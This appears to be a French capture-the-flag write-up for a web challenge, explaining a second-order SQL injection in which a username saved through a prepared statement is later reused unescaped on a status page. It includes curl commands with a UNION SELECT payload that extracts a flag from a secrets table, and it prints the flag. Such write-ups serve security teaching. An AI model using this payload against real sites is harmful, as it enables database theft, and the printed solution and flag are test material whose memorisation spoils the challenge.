# Formulaire en Double

Web · 400 points · Créé par [@PercevalFox](https://github.com/PercevalFox)

L'inscription enregistre le nom d'utilisateur avec une requête préparée, donc rien à tenter de ce côté-là. Mais la page de
suivi relit ce nom en base et le colle tel quel dans une deuxième requête. C'est une injection SQL de second ordre : la
charge dort dans la base, puis se réveille quand la page la relit.

On s'inscrit avec un nom qui contient l'injection, on récupère l'identifiant donné à l'inscription (ainsi que le jeton de
suivi qui l'accompagne), puis on ouvre la page de suivi de ce compte.

```bash
B=https://formulaire-en-double.cyberzerk.fr
curl -s "$B/?action=register&username=zz%27%20UNION%20SELECT%20flag%20FROM%20secrets--%20-"
# la réponse donne un identifiant et un jeton de suivi
curl -s "$B/?action=status&id=<identifiant>&t=<jeton>"
```

Les outils automatiques comme sqlmap ne trouvent pas ce genre de faille tout seuls, car l'injection ne se déclenche pas dans
la requête qui l'envoie, mais dans une page différente, plus tard.

**Flag :** `CyberZerk{s3c0nd_0rdr3_l3_payl0ad_d0rt_pu1s_s3_r3v31ll3}`
